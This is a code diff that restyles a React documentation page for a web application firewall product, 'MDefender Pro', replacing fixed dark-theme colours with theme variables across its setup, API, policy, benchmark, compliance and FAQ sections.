-                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
-                border: '1px solid #334155',
+                background: t.cardGrad,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '24px'
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '14px' }}>
-                  <i className="fa-solid fa-plug" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '14px' }}>
+                  <i className="fa-solid fa-plug" style={{ color: t.accentText, marginRight: '10px' }}></i>
                   How to Connect in 3 Steps
                 </h3>
-                <ol style={{ paddingLeft: '20px', fontSize: '13.5px', color: '#cbd5e1', lineHeight: '1.9', margin: 0 }}>
+                <ol style={{ paddingLeft: '20px', fontSize: '13.5px', color: t.body, lineHeight: '1.9', margin: 0 }}>
                   <li>
-                    <strong>Upload &amp; Activate:</strong> In your WordPress admin panel, go to <code>Plugins &rarr; Add New &rarr; Upload Plugin</code>, choose <code>mdefender-pro.zip</code>, and click <strong>Activate</strong>.
+                    <strong>Upload &amp; Activate:</strong> In your WordPress admin panel, go to <code className="doc-inline-code">Plugins &rarr; Add New &rarr; Upload Plugin</code>, choose <code className="doc-inline-code">mdefender-pro.zip</code>, and click <strong>Activate</strong>.
                   </li>
                   <li>
-                    <strong>Paste Your API Key:</strong> Navigate to <code>MDefender Pro &rarr; Settings</code> in your WP sidebar and enter your API Key from the MDefender dashboard.
+                    <strong>Paste Your API Key:</strong> Navigate to <code className="doc-inline-code">MDefender Pro &rarr; Settings</code> in your WP sidebar and enter your API Key from the MDefender dashboard.
                   </li>
                   <li>
-                    <strong>Save &amp; Connect:</strong> Click <strong>Save &amp; Test Connection</strong>. The plugin connects to the MDefender backend via <code>/api/v1/wordpress/connect</code> and enables real-time ML protection immediately.
+                    <strong>Save &amp; Connect:</strong> Click <strong>Save &amp; Test Connection</strong>. The plugin connects to the MDefender backend via <code className="doc-inline-code">/api/v1/wordpress/connect</code> and enables real-time ML protection immediately.
                   </li>
                 </ol>
               </div>
@@ -1515,18 +1571,18 @@ class MDefenderWaf
           {activeSection === 'api-auth' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: '#38bdf8', fontSize: '12px', fontWeight: '700' }}>REST API</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: t.accentText, fontSize: '12px', fontWeight: '700' }}>REST API</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Authentication Endpoints</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Authentication Endpoints</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 Authenticate and manage API session tokens:
               </p>
-              <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px', marginBottom: '20px' }}>
+              <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow, marginBottom: '20px' }}>
                 <div style={{ display: 'flex', alignItems: 'center', marginBottom: '10px' }}>
                   <MethodBadge method="POST" />
-                  <code style={{ fontSize: '14px', fontWeight: '700', color: '#ffffff' }}>/api/v1/auth/login</code>
+                  <code style={{ fontSize: '14px', fontWeight: '700', color: t.heading }}>/api/v1/auth/login</code>
                 </div>
-                <p style={{ fontSize: '13px', color: '#94a3b8', margin: '0 0 14px' }}>Exchange user credentials for a JWT bearer token.</p>
+                <p style={{ fontSize: '13px', color: t.muted, margin: '0 0 14px' }}>Exchange user credentials for a JWT bearer token.</p>
                 <CodeBlock language="json" code={`// Response 200 OK:
 {
   "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
@@ -1545,16 +1601,16 @@ class MDefenderWaf
           {activeSection === 'api-rules' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(168, 85, 247, 0.15)', border: '1px solid rgba(168, 85, 247, 0.3)', color: '#c084fc', fontSize: '12px', fontWeight: '700' }}>REST API</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(168, 85, 247, 0.15)', border: '1px solid rgba(168, 85, 247, 0.3)', color: '#7c3aed', fontSize: '12px', fontWeight: '700' }}>REST API</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Custom Rules CRUD API</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Custom Rules CRUD API</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 Manage custom regular expression security policies programmatically:
               </p>
-              <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px', marginBottom: '20px' }}>
+              <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow, marginBottom: '20px' }}>
                 <div style={{ display: 'flex', alignItems: 'center', marginBottom: '10px' }}>
                   <MethodBadge method="GET" />
-                  <code style={{ fontSize: '14px', fontWeight: '700', color: '#ffffff' }}>/api/v1/user/rules</code>
+                  <code style={{ fontSize: '14px', fontWeight: '700', color: t.heading }}>/api/v1/user/rules</code>
                 </div>
                 <CodeBlock language="json" code={`{
   "rules": [
@@ -1577,16 +1633,16 @@ class MDefenderWaf
           {activeSection === 'api-telemetry' && (
             <div>
               <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
-                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#34d399', fontSize: '12px', fontWeight: '700' }}>REST API</span>
+                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#059669', fontSize: '12px', fontWeight: '700' }}>REST API</span>
               </div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Logs &amp; Metrics Streams</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Logs &amp; Metrics Streams</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 Stream real-time incident logs and aggregate security metrics:
               </p>
-              <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px', marginBottom: '20px' }}>
+              <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow, marginBottom: '20px' }}>
                 <div style={{ display: 'flex', alignItems: 'center', marginBottom: '10px' }}>
                   <MethodBadge method="GET" />
-                  <code style={{ fontSize: '14px', fontWeight: '700', color: '#ffffff' }}>/api/v1/user/logs?limit=50&amp;status=blocked</code>
+                  <code style={{ fontSize: '14px', fontWeight: '700', color: t.heading }}>/api/v1/user/logs?limit=50&amp;status=blocked</code>
                 </div>
                 <CodeBlock language="json" code={`{
   "logs": [
@@ -1616,30 +1672,31 @@ class MDefenderWaf
                   borderRadius: '20px',
                   background: 'rgba(99, 102, 241, 0.15)',
                   border: '1px solid rgba(99, 102, 241, 0.3)',
-                  color: '#818cf8',
+                  color: '#7c3aed',
                   fontSize: '12px',
                   fontWeight: '700'
                 }}>Tenant Policies</span>
               </div>
 
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Authoring Custom Regex Policies</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Authoring Custom Regex Policies</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 Create custom regular expression patterns to block domain-specific threats, protect proprietary endpoints, or filter bot traffic.
               </p>
 
               <div style={{
-                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
-                border: '1px solid #334155',
+                background: t.cardGrad,
+                border: t.cardBorder,
                 borderRadius: '16px',
                 padding: '24px',
+                boxShadow: t.cardShadow,
                 marginBottom: '24px'
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '12px' }}>
-                  <i className="fa-solid fa-sliders" style={{ color: '#38bdf8', marginRight: '8px' }}></i>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '12px' }}>
+                  <i className="fa-solid fa-sliders" style={{ color: t.accentText, marginRight: '8px' }}></i>
                   PCRE Regex Syntax Guidelines
                 </h3>
-                <p style={{ fontSize: '13px', color: '#94a3b8', lineHeight: '1.6', marginBottom: '14px' }}>
-                  Custom rules support standard PCRE regex with case-insensitive modifiers (<code>{"(?i)"}</code>) and word boundary constraints.
+                <p style={{ fontSize: '13px', color: t.muted, lineHeight: '1.6', marginBottom: '14px' }}>
+                  Custom rules support standard PCRE regex with case-insensitive modifiers (<code className="doc-inline-code">(?i)</code>) and word boundary constraints.
                 </p>
 
                 <CodeBlock
@@ -1666,29 +1723,30 @@ class MDefenderWaf
                   borderRadius: '20px',
                   background: 'rgba(16, 185, 129, 0.15)',
                   border: '1px solid rgba(16, 185, 129, 0.3)',
-                  color: '#34d399',
+                  color: '#059669',
                   fontSize: '12px',
                   fontWeight: '700'
                 }}>Zero-Downtime Sync</span>
               </div>
 
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Tenant Isolation &amp; Policy Actions</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Tenant Isolation &amp; Policy Actions</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 MDefender employs strict tenant isolation to guarantee privacy and ensure zero policy pollution across organizations.
               </p>
 
               <div style={{
-                background: '#0a0e1a',
-                border: '1px solid #1e293b',
+                background: t.cardBgAlt,
+                border: t.cardBorder,
                 borderRadius: '16px',
-                padding: '24px'
+                padding: '24px',
+                boxShadow: t.cardShadow
               }}>
-                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '12px' }}>
-                  <i className="fa-solid fa-lock" style={{ color: '#10b981', marginRight: '8px' }}></i>
+                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '12px' }}>
+                  <i className="fa-solid fa-lock" style={{ color: '#059669', marginRight: '8px' }}></i>
                   Cryptographic Scoping Guarantee
                 </h3>
-                <p style={{ fontSize: '13px', color: '#94a3b8', lineHeight: '1.7', margin: 0 }}>
-                  Custom rules created under your account are tagged exclusively with your <code>user_id</code> and <code>website_id</code>. They never bleed into other tenants' traffic, ensuring zero cross-tenant interference.
+                <p style={{ fontSize: '13px', color: t.muted, lineHeight: '1.7', margin: 0 }}>
+                  Custom rules created under your account are tagged exclusively with your <code className="doc-inline-code">user_id</code> and <code className="doc-inline-code">website_id</code>. They never bleed into other tenants' traffic, ensuring zero cross-tenant interference.
                 </p>
               </div>
             </div>
@@ -1703,7 +1761,7 @@ class MDefenderWaf
                   borderRadius: '20px',
                   background: 'linear-gradient(135deg, rgba(37,99,235,0.2), rgba(124,58,237,0.2))',
                   border: '1px solid rgba(59, 130, 246, 0.4)',
-                  color: '#60a5fa',
+                  color: dark ? '#60a5fa' : '#2563eb',
                   fontSize: '12px',
                   fontWeight: '700'
                 }}>Super Admin Feature</span>
@@ -1712,41 +1770,41 @@ class MDefenderWaf
                   borderRadius: '20px',
                   background: 'rgba(16, 185, 129, 0.15)',
                   border: '1px solid rgba(16, 185, 129, 0.3)',
-                  color: '#34d399',
+                  color: '#059669',
                   fontSize: '12px',
                   fontWeight: '700'
                 }}>Active Learning Loop</span>
               </div>
 
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Attack Learning Lab &amp; Feedback Hub</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
-                Located at <code>/admin/learning</code>, the <strong>Attack Learning Lab</strong> empowers security teams to handle false positive reports, test new attack vectors in a live sandbox, and fine-tune the 5,489,242+ dataset ML classifier with <strong>zero server downtime</strong>.
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Attack Learning Lab &amp; Feedback Hub</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
+                Located at <code className="doc-inline-code">/admin/learning</code>, the <strong>Attack Learning Lab</strong> empowers security teams to handle false positive reports, test new attack vectors in a live sandbox, and fine-tune the 5,489,242+ dataset ML classifier with <strong>zero server downtime</strong>.
               </p>
 
               <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px', marginBottom: '24px' }}>
-                <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px' }}>
-                  <h4 style={{ color: '#38bdf8', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
+                <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow }}>
+                  <h4 style={{ color: t.accentText, margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                     <i className="fa-solid fa-inbox" style={{ marginRight: '6px' }}></i> Reports Inbox
                   </h4>
-                  <p style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
+                  <p style={{ fontSize: '12.5px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                     Review flagged false positive submissions directly from users. 1-click whitelist creation instantly bypasses verified legitimate requests across all edge nodes.
                   </p>
                 </div>
 
-                <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px' }}>
-                  <h4 style={{ color: '#a78bfa', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
+                <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow }}>
+                  <h4 style={{ color: '#7c3aed', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                     <i className="fa-solid fa-flask-vial" style={{ marginRight: '6px' }}></i> Attack Sandbox
                   </h4>
-                  <p style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
+                  <p style={{ fontSize: '12.5px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                     Simulate complex SQLi, XSS, and RCE chains interactively. Inspect sub-millisecond risk scores, vector tokens, and decision engine breakdown in real-time.
                   </p>
                 </div>
 
-                <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px' }}>
-                  <h4 style={{ color: '#34d399', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
+                <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow }}>
+                  <h4 style={{ color: '#059669', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                     <i className="fa-solid fa-rotate" style={{ marginRight: '6px' }}></i> Zero-Downtime Retraining
                   </h4>
-                  <p style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
+                  <p style={{ fontSize: '12.5px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                     Incorporate verified missed attacks into the active ML training corpus. Trigger incremental SGD model training with hot reload without restarting backend servers.
                   </p>
                 </div>
@@ -1757,46 +1815,47 @@ class MDefenderWaf
           {/* Section: Latency & Benchmarks */}
           {activeSection === 'benchmarks' && (
             <div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Latency, Throughput &amp; Benchmarks</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Latency, Throughput &amp; Benchmarks</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 MDefender Pro is engineered for high-concurrency production workloads with sub-millisecond execution overhead:
               </p>
 
               <div style={{
-                background: '#0c1222',
-                border: '1px solid #1e293b',
+                background: t.cardBg,
+                border: t.cardBorder,
                 borderRadius: '12px',
                 padding: '20px',
+                boxShadow: t.cardShadow,
                 marginBottom: '24px',
                 overflowX: 'auto'
               }}>
                 <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '13.5px' }}>
                   <thead>
-                    <tr style={{ background: '#090d18', textAlign: 'left', borderBottom: '1px solid #334155' }}>
-                      <th style={{ padding: '12px 16px', color: '#f8fafc' }}>Component</th>
-                      <th style={{ padding: '12px 16px', color: '#f8fafc' }}>Average Latency</th>
-                      <th style={{ padding: '12px 16px', color: '#f8fafc' }}>p99 Latency</th>
-                      <th style={{ padding: '12px 16px', color: '#f8fafc' }}>Throughput</th>
+                    <tr style={{ background: t.tableHeadBg, textAlign: 'left', borderBottom: `1px solid ${t.tableBorder}` }}>
+                      <th style={{ padding: '12px 16px', color: t.heading }}>Component</th>
+                      <th style={{ padding: '12px 16px', color: t.heading }}>Average Latency</th>
+                      <th style={{ padding: '12px 16px', color: t.heading }}>p99 Latency</th>
+                      <th style={{ padding: '12px 16px', color: t.heading }}>Throughput</th>
                     </tr>
                   </thead>
                   <tbody>
-                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
-                      <td style={{ padding: '12px 16px', fontWeight: '700', color: '#f1f5f9' }}>2,000 Regex Lookup</td>
-                      <td style={{ padding: '12px 16px', color: '#38bdf8', fontWeight: '700' }}>0.12 ms</td>
-                      <td style={{ padding: '12px 16px', color: '#60a5fa' }}>0.28 ms</td>
-                      <td style={{ padding: '12px 16px', color: '#34d399' }}>65,000 req/sec</td>
+                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
+                      <td style={{ padding: '12px 16px', fontWeight: '700', color: t.heading }}>2,000 Regex Lookup</td>
+                      <td style={{ padding: '12px 16px', color: t.accentText, fontWeight: '700' }}>0.12 ms</td>
+                      <td style={{ padding: '12px 16px', color: dark ? '#60a5fa' : '#2563eb' }}>0.28 ms</td>
+                      <td style={{ padding: '12px 16px', color: '#059669' }}>65,000 req/sec</td>
                     </tr>
-                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
-                      <td style={{ padding: '12px 16px', fontWeight: '700', color: '#f1f5f9' }}>5,489,242+ Dataset ML Inference</td>
-                      <td style={{ padding: '12px 16px', color: '#38bdf8', fontWeight: '700' }}>0.34 ms</td>
-                      <td style={{ padding: '12px 16px', color: '#60a5fa' }}>0.55 ms</td>
-                      <td style={{ padding: '12px 16px', color: '#34d399' }}>48,000 req/sec</td>
+                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
+                      <td style={{ padding: '12px 16px', fontWeight: '700', color: t.heading }}>5,489,242+ Dataset ML Inference</td>
+                      <td style={{ padding: '12px 16px', color: t.accentText, fontWeight: '700' }}>0.34 ms</td>
+                      <td style={{ padding: '12px 16px', color: dark ? '#60a5fa' : '#2563eb' }}>0.55 ms</td>
+                      <td style={{ padding: '12px 16px', color: '#059669' }}>48,000 req/sec</td>
                     </tr>
                     <tr>
-                      <td style={{ padding: '12px 16px', fontWeight: '700', color: '#f1f5f9' }}>Total End-to-End Decision</td>
-                      <td style={{ padding: '12px 16px', color: '#10b981', fontWeight: '800' }}>&lt; 0.85 ms</td>
-                      <td style={{ padding: '12px 16px', color: '#10b981', fontWeight: '800' }}>&lt; 1.40 ms</td>
-                      <td style={{ padding: '12px 16px', color: '#34d399', fontWeight: '800' }}>50,000+ req/sec</td>
+                      <td style={{ padding: '12px 16px', fontWeight: '700', color: t.heading }}>Total End-to-End Decision</td>
+                      <td style={{ padding: '12px 16px', color: '#059669', fontWeight: '800' }}>&lt; 0.85 ms</td>
+                      <td style={{ padding: '12px 16px', color: '#059669', fontWeight: '800' }}>&lt; 1.40 ms</td>
+                      <td style={{ padding: '12px 16px', color: '#059669', fontWeight: '800' }}>50,000+ req/sec</td>
                     </tr>
                   </tbody>
                 </table>
@@ -1807,26 +1866,26 @@ class MDefenderWaf
           {/* Section: SOC 2 & GDPR Compliance */}
           {activeSection === 'compliance' && (
             <div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>SOC 2 &amp; GDPR Data Privacy</h1>
-              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>SOC 2 &amp; GDPR Data Privacy</h1>
+              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                 MDefender Pro follows enterprise security principles to ensure sensitive customer data is never compromised:
               </p>
 
               <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
-                <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px' }}>
-                  <h4 style={{ color: '#10b981', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
+                <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow }}>
+                  <h4 style={{ color: '#059669', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                     <i className="fa-solid fa-user-shield" style={{ marginRight: '6px' }}></i> No PII Storage
                   </h4>
-                  <p style={{ fontSize: '13px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
+                  <p style={{ fontSize: '13px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                     Passwords, auth tokens, credit card numbers, and session cookies are sanitized and discarded in-memory before evaluation.
                   </p>
                 </div>
 
-                <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px' }}>
-                  <h4 style={{ color: '#38bdf8', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
+                <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow }}>
+                  <h4 style={{ color: t.accentText, margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                     <i className="fa-solid fa-lock" style={{ marginRight: '6px' }}></i> Encrypted In-Transit
                   </h4>
-                  <p style={{ fontSize: '13px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
+                  <p style={{ fontSize: '13px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                     All telemetry beacons and synchronization calls utilize TLS 1.3 encryption with HMAC-SHA256 authenticated API tokens.
                   </p>
                 </div>
@@ -1837,7 +1896,7 @@ class MDefenderWaf
           {/* Section: FAQs */}
           {activeSection === 'faqs' && (
             <div>
-              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Frequently Asked Questions</h1>
+              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Frequently Asked Questions</h1>
               
               <div style={{ display: 'flex', flexDirection: 'column', gap: '16px', marginTop: '24px' }}>
                 {[
@@ -1857,16 +1916,17 @@ class MDefenderWaf
                   <div
                     key={i}
                     style={{
-                      background: '#0c1222',
-                      border: '1px solid #1e293b',
+                      background: t.cardBg,
+                      border: t.cardBorder,
                       borderRadius: '12px',
-                      padding: '20px'
+                      padding: '20px',
+                      boxShadow: t.cardShadow
                     }}
                   >
-                    <h3 style={{ fontSize: '15px', fontWeight: '700', marginBottom: '8px', color: '#ffffff' }}>
+                    <h3 style={{ fontSize: '15px', fontWeight: '700', marginBottom: '8px', color: t.heading }}>
                       {faq.q}
                     </h3>
-                    <p style={{ fontSize: '13px', lineHeight: '1.6', color: '#94a3b8', margin: 0 }}>
+                    <p style={{ fontSize: '13px', lineHeight: '1.6', color: t.muted, margin: 0 }}>
                       {faq.a}
                     </p>
                   </div>
